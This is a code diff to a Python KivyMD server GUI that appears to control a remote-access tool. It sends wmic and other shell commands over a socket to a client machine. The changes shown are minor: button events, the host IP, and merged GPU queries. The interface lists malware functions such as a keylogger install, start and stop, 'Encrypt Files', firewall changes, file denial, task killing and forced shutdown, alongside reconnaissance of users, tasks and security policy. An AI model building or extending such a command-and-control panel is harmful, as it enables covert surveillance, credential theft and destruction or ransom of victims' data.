@@ -23,7 +23,7 @@ ScreenManager:
             pos_hint: {"center_x": .5, "center_y": .5}
             opacity: 1
             disabled: False
-            on_press: app.StartServer()
+            on_release: app.StartServer()
         MDLabel:
             id: statusLbl
             text: "Status"
@@ -39,39 +39,39 @@ ScreenManager:
                 OneLineListItem:
                     id: networkInfoBtn
                     text: "Network Info"
-                    on_press: app.NetworkInfo()
+                    on_release: app.NetworkInfo()
                 OneLineListItem:
                     id: osInfoBtn
                     text: "OS Info"
-                    on_press: app.OSInfo()
+                    on_release: app.OSInfo()
                 OneLineListItem:
                     id: gpuInfoBtn
                     text: "GPU Info"
-                    on_press: app.GpuInfo()
+                    on_release: app.GpuInfo()
                 OneLineListItem:
                     id: cpuBtn
                     text: "CPU Usage"
-                    on_press: app.CpuUsage()
+                    on_release: app.CpuUsage()
                 OneLineListItem:
                     id: taskBtn
                     text: "Task List"
-                    on_press: app.Tasks()
+                    on_release: app.Tasks()
                 OneLineListItem:
                     id: netserviceBtn
                     text: "Network Services"
-                    on_press: app.Services()
+                    on_release: app.Services()
                 OneLineListItem:
                     id: userInfoBtn
                     text: "User Information"
-                    on_press: app.UserInfo()
+                    on_release: app.UserInfo()
                 OneLineListItem:
                     id: secPolicy
                     text: "Security Policy"
-                    on_press: app.SecPolicy()
+                    on_release: app.SecPolicy()
                 OneLineListItem:
                     id: memInfo
                     text: "Memory Information"
-                    on_press: app.MemInfo()
+                    on_release: app.MemInfo()
         MDTextField:
             id: consoleField
             max_height: '200dp'
@@ -82,7 +82,7 @@ ScreenManager:
             md_bg_color: 'red'
             pos_hint: {"center_x": .95, "center_y": .1} 
             elevation_normal: 12
-            on_press: app.DisruptionMenu()
+            on_release: app.DisruptionMenu()
     MDScreen:
         name: "disruptionMenu"
         ScrollView:
@@ -90,43 +90,43 @@ ScreenManager:
                 OneLineListItem:
                     id: killTaskBtn
                     text: "Kill Task"
-                    on_press: app.KillTask()
+                    on_release: app.KillTask()
                 OneLineListItem:
                     id: shutDownBtn
                     text: "Shutdown"
-                    on_press: app.Shutdown()
+                    on_release: app.Shutdown()
                 OneLineListItem:
                     id: fileCreateBtn
                     text: "File Creation Disruption"
-                    on_press: app.FileCreate()
+                    on_release: app.FileCreate()
                 OneLineListItem:
                     id: firewallBtn
                     text: "Firewall"
-                    on_press: app.Firewall()
+                    on_release: app.Firewall()
                 OneLineListItem:
                     id: denyFileBtn
                     text: "Deny Files"
-                    on_press: app.DenyFiles()
+                    on_release: app.DenyFiles()
                 OneLineListItem:
                     id: openBrowser
                     text: "Open Browsers"
-                    on_press: app.OpenBrowsers()
+                    on_release: app.OpenBrowsers()
                 OneLineListItem:
                     id: instkeyloggerBtn
                     text: "Install Key Logger"
-                    on_press: app.KeyloggerInstall()
+                    on_release: app.KeyloggerInstall()
                 OneLineListItem:
                     id: keyloggerBtn
                     text: "Key Logger Start"
-                    on_press: app.KeyloggerInit()
+                    on_release: app.KeyloggerInit()
                 OneLineListItem:
                     id: keyloggerstopBtn
                     text: "Key Logger Stop"
-                    on_press: app.KeyloggerStop()
+                    on_release: app.KeyloggerStop()
                 OneLineListItem:
                     id: encryptfilesBtn
                     text: "Encrypt Files"
-                    on_press: app.EncryptFiles()
+                    on_release: app.EncryptFiles()
         MDTextField:
             id: disruptConsoleField
             max_height: '200dp'
@@ -156,7 +156,7 @@ ScreenManager:
         hint_text: 'Enter File Path'
 '''
 # Server IP and Port
-HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
+HOST = '192.168.123.165'  # Temporary localhost for testing (Make sure to use the client's IP during production
 PORT = 21420
 
 class Main(MDApp):
@@ -250,34 +250,18 @@ class Main(MDApp):
             # Reset console
             self.root.ids.consoleField.text = ''
 
-            # Get GPU Name
-            command = 'wmic path win32_VideoController get name'
+            # Get GPU Name, Description & Version
+            command = 'wmic path win32_VideoController get name,Description,DriverVersion'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
 
-            # Get GPU Description
-            command = 'wmic path win32_VideoController get Description'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize2 = self.currConn.recv(1024).decode()
-            output2 = self.currConn.recv(int(recvsize2)).decode()
-
-            # Get GPU Version
-            command = 'wmic path win32_VideoController get DriverVersion'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize3 = self.currConn.recv(1024).decode()
-            output3 = self.currConn.recv(int(recvsize3)).decode()
-
             # Print results
             print('Output:')
             print(output)
-            print(output2)
-            print(output3)
 
-            self.root.ids.consoleField.text = output + output2 + output3
+            self.root.ids.consoleField.text = output
             break
 
     # Zees stuff
